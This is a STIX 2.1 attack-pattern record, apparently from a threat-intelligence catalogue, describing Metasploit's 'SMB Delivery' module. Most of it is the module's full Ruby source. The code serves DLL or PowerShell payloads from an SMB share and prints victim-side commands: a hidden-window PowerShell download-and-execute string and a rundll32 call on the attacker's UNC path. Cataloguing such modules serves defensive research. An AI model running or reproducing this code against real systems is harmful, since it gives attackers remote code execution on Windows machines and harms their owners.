{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--adf98a1c-df2e-4145-83e9-43aae3ca52a3",
    "created": "2024-08-14T16:56:05.981727Z",
    "modified": "2024-08-14T16:56:05.981731Z",
    "name": "\"SMB Delivery\"",
    "description": " This module serves payloads via an SMB server and provides commands to retrieve and execute the generated payloads. Currently supports DLLs and Powershell.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/smb_delivery.rb",
            "external_id": "smb_delivery.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rapid7/metasploit-framework/pull/3074"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::SMB::Server::Share\n  include Msf::Exploit::Powershell\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"SMB Delivery\",\n      'Description'    => %q{\n        This module serves payloads via an SMB server and provides commands to retrieve\n        and execute the generated payloads. Currently supports DLLs and Powershell.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Andrew Smith',\n          'Russel Van Tuyl'\n        ],\n      'References'     =>\n        [\n          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/3074']\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 2048,\n          'DisableNops' => true\n        },\n        'Platform'       => 'win',\n        'Targets'        =>\n          [\n            ['DLL', {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64]\n            }],\n            ['PSH', {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X86, ARCH_X64]\n            }]\n          ],\n        'Privileged'     => false,\n        'DisclosureDate' => '2016-07-26',\n        'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILE_NAME', [ false, 'DLL file name', 'test.dll'])\n      ])\n  end\n\n  def primer\n    print_status('Run the following command on the target machine:')\n    case target.name\n    when 'PSH'\n      self.file_contents = cmd_psh_payload(  payload.encoded,\n                                             payload_instance.arch.first,\n                                             remove_comspec: true,\n                                             wrap_double_quotes: true)\n\n      download_string = Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(unc)\n      download_and_run = \"#{ignore_cert}#{download_string}\"\n      print_line generate_psh_command_line(  noprofile: true,\n                                             windowstyle: 'hidden',\n                                             command: download_and_run)\n    when 'DLL'\n      self.file_contents = generate_payload_dll\n      print_line(\"rundll32.exe #{unc},0\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-07-26",
    "x_mitre_platforms": [
        "win'"
    ]
}